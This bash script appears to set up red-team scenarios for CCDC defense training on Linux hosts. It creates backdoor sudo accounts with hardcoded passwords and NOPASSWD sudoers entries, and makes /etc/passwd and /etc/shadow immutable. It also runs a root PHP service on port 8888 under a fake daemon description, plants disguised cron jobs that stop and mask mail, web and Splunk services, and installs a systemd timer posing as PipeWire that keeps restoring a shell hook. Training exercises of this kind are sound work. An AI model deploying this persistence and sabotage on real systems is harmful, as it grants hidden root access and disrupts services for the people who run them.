#!/usr/bin/env bash
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Linux Combined Setup Script
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# Combines attack setup scripts from SetupScripts/linux/, EXCEPT the target
# provisioning script (CCDC_Linux_TargetSetup_HTTP_Mail_Splunk.sh) and
# the persistence script (CCDC_Linux_Persistence_PlantsVsZerodays.sh).
#
# Supports: Ubuntu, Debian, CentOS, RHEL, Fedora
#
# Sections, in order:
#   1. Rogue users     — CCDC_Linux_Users_HomeIntruders.sh
#                        (3 backdoor sudo/wheel accounts, immutable /etc/passwd+shadow)
#   2. Web shell       — CCDC_Linux_WebShell_OopsAllWebShells.sh
#                        (sillyevilservice PHP service on :8888, runs as root)
#   3. Cron jobs       — CCDC_Linux_CronJobs_ImGonnaCron.sh
#                        (2 cron.d entries that stop+mask scored services)
#   4. Bee Movie hook  — CCDC_Linux_BeeMovie_OopsAllBees.sh
#                        (disguised systemd timer re-plants a PROMPT_COMMAND)
#
# The original scripts are untouched and still runnable individually —
# this is just a single-shot version for standing everything up at once.
#
# Usage: sudo bash CCDC_Linux_COMBINED.sh
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

set -euo pipefail

# ── Colour helpers (shared by every section) ──────────────────────────────────
RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; NC='\033[0m'

info()    { echo -e "${CYAN}[*]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
success() { echo -e "${GREEN}[+]${NC} $*"; }
err()     { echo -e "${RED}[-]${NC} $*" >&2; }
die()     { err "$*"; exit 1; }

# ── Distro detection ──────────────────────────────────────────────────────────
detect_distro() {
    if [[ -f /etc/os-release ]]; then
        . /etc/os-release
        OS=$ID
        OS_PRETTY=$PRETTY_NAME
    elif [[ -f /etc/redhat-release ]]; then
        OS="rhel"
        OS_PRETTY="$(cat /etc/redhat-release)"
    else
        OS="unknown"
        OS_PRETTY="Unknown Linux"
    fi
}

# Determine package manager and web server name
set_distro_vars() {
    case "$OS" in
        ubuntu|debian)
            PKG_MGR="apt-get"
            PKG_UPDATE="apt-get update -y"
            PKG_INSTALL="apt-get install -y"
            SUDO_GROUP="sudo"
            WEB_SERVER="apache2"
            WEB_SERVER_SVC="apache2"
            BASH_RC_PATH="/etc/bash.bashrc"
            ;;
        centos|rhel)
            PKG_MGR="yum"
            PKG_UPDATE="yum update -y"
            PKG_INSTALL="yum install -y"
            SUDO_GROUP="wheel"
            WEB_SERVER="httpd"
            WEB_SERVER_SVC="httpd"
            BASH_RC_PATH="/etc/bashrc"
            ;;
        fedora)
            PKG_MGR="dnf"
            PKG_UPDATE="dnf update -y"
            PKG_INSTALL="dnf install -y"
            SUDO_GROUP="wheel"
            WEB_SERVER="httpd"
            WEB_SERVER_SVC="httpd"
            BASH_RC_PATH="/etc/bashrc"
            ;;
        *)
            err "Unknown distro: $OS"
            exit 1
            ;;
    esac
}

detect_distro
set_distro_vars

info "Detected OS: $OS_PRETTY"
info "Package manager: $PKG_MGR"
info "Web server: $WEB_SERVER"
info "Sudo group: $SUDO_GROUP"
echo

section() {
    echo
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  $*${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo
}

# ── Privilege check ───────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    err "This script must be run as root (sudo $0)."
    exit 1
fi

# =============================================================================
# 1. ROGUE USERS — backdoor sudo accounts + immutable /etc/passwd,/etc/shadow
# (from CCDC_Linux_Users_HomeIntruders.sh)
# =============================================================================
section_users() {
    section "1/4 — Rogue users: backdoor sudo accounts"

    # Format: "username:password"
    local -a EVIL_USERS=(
        "ubuntu:Rem0veMe!"
        "johnredteam:R3dT3am@2024"
        "systemd-bus-proxy:Ev1lR00t#!"
    )

    local USER_SHELL="/bin/bash"
    # SUDO_GROUP is set by set_distro_vars based on detected OS

    info "Creating backdoor training users..."
    echo

    local entry USERNAME PASSWORD SUDOERS_FILE
    for entry in "${EVIL_USERS[@]}"; do
        USERNAME="${entry%%:*}"
        PASSWORD="${entry##*:}"

        if id "${USERNAME}" &>/dev/null; then
            warn "User '${USERNAME}' already exists — skipping creation."
        else
            useradd \
                --create-home \
                --shell "${USER_SHELL}" \
                "${USERNAME}"
            success "Created user: ${USERNAME}"
        fi

        # Set password
        echo "${USERNAME}:${PASSWORD}" | chpasswd
        success "Password set for: ${USERNAME}"

        # Add to sudo/wheel group
        usermod -aG "${SUDO_GROUP}" "${USERNAME}"
        success "Added '${USERNAME}' to group '${SUDO_GROUP}'"

        # Also drop a sudoers.d entry — a second persistence point for trainees to find
        SUDOERS_FILE="/etc/sudoers.d/99-${USERNAME}"
        echo "${USERNAME} ALL=(ALL:ALL) NOPASSWD: ALL" > "${SUDOERS_FILE}"
        chmod 440 "${SUDOERS_FILE}"
        success "Sudoers drop-in written: ${SUDOERS_FILE}"

        echo
    done

    # Make /etc/passwd, /etc/shadow, and the sudoers.d drop-ins immutable
    info "Setting immutable flag on /etc/passwd, /etc/shadow, and /etc/sudoers.d/ entries..."

    chattr +i /etc/passwd
    success "chattr +i applied to: /etc/passwd"

    chattr +i /etc/shadow
    success "chattr +i applied to: /etc/shadow"

    for entry in "${EVIL_USERS[@]}"; do
        USERNAME="${entry%%:*}"
        SUDOERS_FILE="/etc/sudoers.d/99-${USERNAME}"
        chattr +i "${SUDOERS_FILE}"
        success "chattr +i applied to: ${SUDOERS_FILE}"
    done
}

# =============================================================================
# 3. WEB SHELL — sillyevilservice PHP service on :8888, runs as root
# (from CCDC_Linux_WebShell_OopsAllWebShells.sh)
# =============================================================================
section_webshell() {
    section "2/4 — Web shell: sillyevilservice (PHP, port 8888, root)"

    local SERVICE_NAME="sillyevilservice"
    local SERVE_PORT="8888"
    local WEB_ROOT="/opt/${SERVICE_NAME}/www"
    local SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
    local PHP_INDEX="${WEB_ROOT}/index.php"
    local ROUTER_SCRIPT="/opt/${SERVICE_NAME}/router.php"

    # -- Install dependencies --
    info "Updating package index and installing PHP CLI..."
    $PKG_UPDATE > /dev/null 2>&1 || true
    $PKG_INSTALL php-cli > /dev/null 2>&1

    local PHP_BIN
    PHP_BIN="$(command -v php)"
    success "PHP installed: ${PHP_BIN} ($(${PHP_BIN} -r 'echo PHP_VERSION;'))"

    # -- Create web root --
    info "Creating web root at ${WEB_ROOT}..."
    mkdir -p "${WEB_ROOT}"
    success "Web root created: ${WEB_ROOT}"

    # -- Write PHP page --
    info "Writing index.php..."
    cat > "${PHP_INDEX}" <<'PHPEOF'
<?php
$hostname = gethostname();
$ip       = $_SERVER['SERVER_ADDR'] ?? 'unknown';
$port     = $_SERVER['SERVER_PORT'] ?? 'unknown';
$ts       = date('Y-m-d H:i:s T');
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>sillyevilservice</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #0d0d0d;
      color: #ff3333;
      font-family: 'Courier New', Courier, monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
      padding: 2rem;
    }
    h1 {
      font-size: clamp(2.5rem, 8vw, 6rem);
      letter-spacing: 0.05em;
      text-shadow: 0 0 20px #ff0000, 0 0 60px #ff000066;
      animation: pulse 2s ease-in-out infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50%       { opacity: 0.6; }
    }
    .subtitle {
      margin-top: 1.5rem;
      font-size: 1.1rem;
      color: #ff6666;
      opacity: 0.8;
    }
    .meta {
      margin-top: 3rem;
      font-size: 0.75rem;
      color: #555;
      line-height: 1.8;
      border-top: 1px solid #222;
      padding-top: 1.5rem;
    }
    .meta span { color: #ff4444; }
  </style>
</head>
<body>
  <h1>GET RID OF ME!</h1>
  <p class="subtitle">Wow! You found a rogue service. Now take it down. This is an evil service that picks a number 1-100 every second and if it picks 67 your computer will be destroyed! <3</p>
  <div class="meta">
    <span>service:</span> sillyevilservice &nbsp;|&nbsp;
    <span>host:</span> <?= htmlspecialchars($hostname) ?> &nbsp;|&nbsp;
    <span>port:</span> <?= htmlspecialchars($port) ?><br>
    <span>running as:</span> <?= htmlspecialchars(posix_getpwuid(posix_geteuid())['name'] ?? 'unknown') ?> &nbsp;|&nbsp;
    <span>pid:</span> <?= getmypid() ?> &nbsp;|&nbsp;
    <span>time:</span> <?= htmlspecialchars($ts) ?>
  </div>
</body>
</html>
PHPEOF
    success "index.php written: ${PHP_INDEX}"

    # -- Write PHP router (keeps php -S serving index.php for any path) --
    cat > "${ROUTER_SCRIPT}" <<'ROUTEREOF'
<?php
// Route every request to index.php so trainees can hit any path
$requested = __DIR__ . '/www' . parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
if (is_file($requested)) {
    return false; // serve the real file
}
require __DIR__ . '/www/index.php';
ROUTEREOF
    success "Router script written: ${ROUTER_SCRIPT}"

    # -- Write systemd service unit --
    info "Writing systemd service unit: ${SERVICE_FILE}..."
    cat > "${SERVICE_FILE}" <<EOF
[Unit]
Description=sillyevilservice - system network optimiser daemon
Documentation=https://example.com
After=network.target
Wants=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/${SERVICE_NAME}
ExecStart=${PHP_BIN} -S 0.0.0.0:${SERVE_PORT} router.php
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal
SyslogIdentifier=${SERVICE_NAME}

[Install]
WantedBy=multi-user.target
EOF
    chmod 644 "${SERVICE_FILE}"
    success "Service unit written: ${SERVICE_FILE}"

    # -- Enable and start service --
    info "Reloading systemd daemon..."
    systemctl daemon-reload

    info "Enabling ${SERVICE_NAME} (persists across reboots)..."
    systemctl enable "${SERVICE_NAME}"

    info "Starting ${SERVICE_NAME}..."
    systemctl start "${SERVICE_NAME}"

    # -- Verify it's running --
    sleep 1
    if systemctl is-active --quiet "${SERVICE_NAME}"; then
        success "Service is running!"
    else
        err "Service failed to start. Check: journalctl -u ${SERVICE_NAME} -n 30"
        exit 1
    fi

    # -- Summary --
    echo
    warn "========== WEB SHELL INJECTION COMPLETE =========="
    echo
    echo -e "  ${YELLOW}Service name:${NC}    ${SERVICE_NAME}"
    echo -e "  ${YELLOW}Listening on:${NC}    http://0.0.0.0:${SERVE_PORT}"
    echo -e "  ${YELLOW}Running as:${NC}      root"
    echo -e "  ${YELLOW}Web root:${NC}        ${WEB_ROOT}"
    echo -e "  ${YELLOW}Service unit:${NC}    ${SERVICE_FILE}"
    echo -e "  ${YELLOW}Enabled:${NC}         yes (survives reboot)"
    echo
    echo -e "  ${YELLOW}Verify it's live:${NC}"
    echo    "    curl http://localhost:${SERVE_PORT}"
    echo    "    ss -tlnp | grep ${SERVE_PORT}"
    echo
    echo -e "  ${YELLOW}Remediation steps trainees must complete:${NC}"
    echo    "    1. systemctl stop ${SERVICE_NAME}"
    echo    "    2. systemctl disable ${SERVICE_NAME}"
    echo    "    3. rm ${SERVICE_FILE}"
    echo    "    4. systemctl daemon-reload"
    echo    "    5. rm -rf /opt/${SERVICE_NAME}"
    echo
}

# =============================================================================
# 4. CRON JOBS — 2 cron.d entries that stop+mask scored services
# (from CCDC_Linux_CronJobs_ImGonnaCron.sh)
# =============================================================================
section_cronjobs() {
    section "3/4 — Cron jobs: service killers in /etc/cron.d"

    local CRON_DIR="/etc/cron.d"

    # Job 1 — disguised as a grub/boot service helper
    local JOB1_FILE="${CRON_DIR}/grub-service"
    local JOB1_SCHEDULE="*/5 * * * *"   # every 5 minutes
    local JOB1_USER="root"

    # Job 2 — less subtle, obviously evil name for trainees to spot
    local JOB2_FILE="${CRON_DIR}/sillyevilcronjob"
    local JOB2_SCHEDULE="*/3 * * * *"   # every 3 minutes
    local JOB2_USER="root"

    # Services to stop & mask
    # Note: use $WEB_SERVER_SVC (apache2 or httpd) and "splunk" (may vary)
    local -a SERVICES=("dovecot" "postfix" "$WEB_SERVER_SVC" "splunk")

    # Build the inline command: stop + mask each service
    local -a parts=()
    local svc
    for svc in "${SERVICES[@]}"; do
        parts+=("systemctl stop ${svc} 2>/dev/null; systemctl mask ${svc} 2>/dev/null")
    done
    local IFS="; "
    local CMD="${parts[*]}"
    unset IFS

    # Write Job 1
    info "Writing cron job 1  →  ${JOB1_FILE}"
    cat > "${JOB1_FILE}" <<EOF
# grub-env sync helper — do not remove (system managed)
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

${JOB1_SCHEDULE}  ${JOB1_USER}  ${CMD}
EOF
    chmod 644 "${JOB1_FILE}"
    success "Job 1 written: ${JOB1_FILE}"

    # Write Job 2
    info "Writing cron job 2  →  ${JOB2_FILE}"
    cat > "${JOB2_FILE}" <<EOF
# system maintenance task
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

${JOB2_SCHEDULE}  ${JOB2_USER}  ${CMD}
EOF
    chmod 644 "${JOB2_FILE}"
    success "Job 2 written: ${JOB2_FILE}"
}

# =============================================================================
# 5. BEE MOVIE HOOK — disguised systemd timer re-plants a PROMPT_COMMAND
# (from CCDC_Linux_BeeMovie_OopsAllBees.sh)
# =============================================================================
section_beemovie() {
    section "4/4 — Bee Movie hook: disguised systemd-pipewire-multithread-runner"

    local SERVICE="systemd-pipewire-multithread-runner"
    local LIB_DIR="/usr/local/lib/${SERVICE}"
    local HOOK="/etc/profile.d/99-pipewire-session-env.sh"
    local BACKUP="${LIB_DIR}/hook.sh.bak"
    local ENFORCER="${LIB_DIR}/enforce.sh"
    local SVC_FILE="/etc/systemd/system/${SERVICE}.service"
    local TIMER_FILE="/etc/systemd/system/${SERVICE}.timer"

    # -- Create library directory --
    info "Creating runtime library at ${LIB_DIR}..."
    mkdir -p "${LIB_DIR}"
    chmod 755 "${LIB_DIR}"

    # -- Write the profile hook --
    # Sourced by /etc/profile (login shells) and /etc/bash.bashrc (non-login
    # interactive shells, after the source line added below).
    # Installs _pipewire_session_env_check into PROMPT_COMMAND if not already set.
    info "Installing session environment hook at ${HOOK}..."
    cat > "${HOOK}" << 'HOOK_EOF'
# /etc/profile.d/99-pipewire-session-env.sh
# PipeWire Session Environment Initialiser
# Managed by systemd-pipewire-multithread-runner.service
# This file is monitored and automatically restored if removed or modified.

_pipewire_session_env_check() {
    printf '\e[2m%s\e[0m\n' \
        "According to all known laws of aviation, there is no way a bee should be able to fly." \
        "Its wings are too small to get its fat little body off the ground." \
        "The bee, of course, flies anyway because bees don't care what humans think is impossible."
}

if [[ -n "${BASH_VERSION:-}" ]] && [[ "${-}" == *i* ]]; then
    [[ "${PROMPT_COMMAND:-}" != *_pipewire_session_env_check* ]] && \
        PROMPT_COMMAND="_pipewire_session_env_check${PROMPT_COMMAND:+; $PROMPT_COMMAND}"
fi
HOOK_EOF
    chmod 644 "${HOOK}"
    success "Installed ${HOOK}"

    # Stash a backup the enforcer restores from
    cp "${HOOK}" "${BACKUP}"
    chmod 644 "${BACKUP}"
    success "Backed up hook to ${BACKUP}"

    # Some distros' bash.bashrc/bashrc do not source /etc/profile.d/ by itself.
    # Add a source line so non-login interactive shells also pick up the hook.
    if ! grep -qF "99-pipewire-session-env.sh" "$BASH_RC_PATH" 2>/dev/null; then
        printf '\n# systemd-pipewire-multithread-runner: session environment init\n' >> "$BASH_RC_PATH"
        printf '[ -r /etc/profile.d/99-pipewire-session-env.sh ] && . /etc/profile.d/99-pipewire-session-env.sh\n' \
            >> "$BASH_RC_PATH"
        success "Added source line to $BASH_RC_PATH (covers non-login shells)"
    fi

    # -- Write the enforcement script --
    # Runs every 60 seconds via the timer. Checks that the hook exists and still
    # contains the function marker; restores from backup if not.
    info "Writing enforcement script at ${ENFORCER}..."
    cat > "${ENFORCER}" << 'ENFORCER_EOF'
#!/usr/bin/env bash
# systemd-pipewire-multithread-runner: session environment enforcement agent
# Verifies the PipeWire session environment hook is present and intact.
# Restores from backup automatically if absent or tampered with.

HOOK="/etc/profile.d/99-pipewire-session-env.sh"
BACKUP="/usr/local/lib/systemd-pipewire-multithread-runner/hook.sh.bak"
MARKER="_pipewire_session_env_check"

if [[ ! -f "${HOOK}" ]] || ! grep -qF "${MARKER}" "${HOOK}" 2>/dev/null; then
    logger -t systemd-pipewire-multithread-runner "Session env hook absent or tampered — restoring"
    cp "${BACKUP}" "${HOOK}"
    chmod 644 "${HOOK}"
    logger -t systemd-pipewire-multithread-runner "Session env hook restored from backup"
fi
ENFORCER_EOF
    chmod 755 "${ENFORCER}"
    success "Created ${ENFORCER}"

    # -- Write the systemd service unit --
    info "Installing systemd service at ${SVC_FILE}..."
    cat > "${SVC_FILE}" << SVC_EOF
[Unit]
Description=PipeWire Multithread Session Runner
Documentation=https://gitlab.freedesktop.org/pipewire/pipewire
After=local-fs.target pipewire.service
ConditionPathExists=${ENFORCER}

[Service]
Type=oneshot
ExecStart=${ENFORCER}
StandardOutput=journal
StandardError=journal
SyslogIdentifier=systemd-pipewire-multithread-runner
RemainAfterExit=no
SVC_EOF
    chmod 644 "${SVC_FILE}"
    success "Installed ${SVC_FILE}"

    # -- Write the systemd timer unit --
    # Fires 30 s after boot, then every 60 s. Persistent=true means a missed
    # tick (host was off) fires immediately on next boot.
    info "Installing systemd timer at ${TIMER_FILE}..."
    cat > "${TIMER_FILE}" << TIMER_EOF
[Unit]
Description=PipeWire Multithread Session Runner Timer
After=local-fs.target

[Timer]
OnBootSec=30s
OnUnitActiveSec=60s
AccuracySec=10s
Persistent=true

[Install]
WantedBy=timers.target
TIMER_EOF
    chmod 644 "${TIMER_FILE}"
    success "Installed ${TIMER_FILE}"

    # -- Enable and start --
    info "Enabling and starting ${SERVICE}.timer..."
    systemctl daemon-reload
    systemctl enable "${SERVICE}.timer" 2>/dev/null || true
    systemctl start  "${SERVICE}.timer" 2>/dev/null || true
    systemctl start  "${SERVICE}.service" 2>/dev/null || true

    # -- Summary --
    local TIMER_STATE
    TIMER_STATE="$(systemctl is-active "${SERVICE}.timer" 2>/dev/null || echo 'failed')"
    echo
    success "${SERVICE} planted."
    echo -e "  ${YELLOW}Timer:${NC}    ${TIMER_STATE}"
    echo -e "  ${YELLOW}Fires:${NC}    30 s after boot, then every 60 s"
    echo -e "  ${YELLOW}Hook:${NC}     ${HOOK}"
    echo -e "  ${YELLOW}Backup:${NC}   ${BACKUP}"
    echo -e "  ${YELLOW}Enforcer:${NC} ${ENFORCER}"
    echo -e "  ${YELLOW}Service:${NC}  ${SVC_FILE}"
    echo -e "  ${YELLOW}Timer:${NC}    ${TIMER_FILE}"
    echo
    warn "Open a new shell to confirm PROMPT_COMMAND is active."
    warn "Effect: Bee Movie opening printed before every bash prompt."
}

# =============================================================================
# MAIN
# =============================================================================
main() {
    section_users
    section_webshell
    section_cronjobs
    section_beemovie

    section "ALL SECTIONS COMPLETE"
    success "Rogue users, web shell, cron jobs, and Bee Movie hook are all planted."
    warn "Target setup (CCDC_Linux_TargetSetup_HTTP_Mail_Splunk.sh) was NOT run — run it separately if needed."
    warn "Persistence (CCDC_Linux_Persistence_PlantsVsZerodays.sh) was NOT run — run it separately if needed."
}

main "$@"
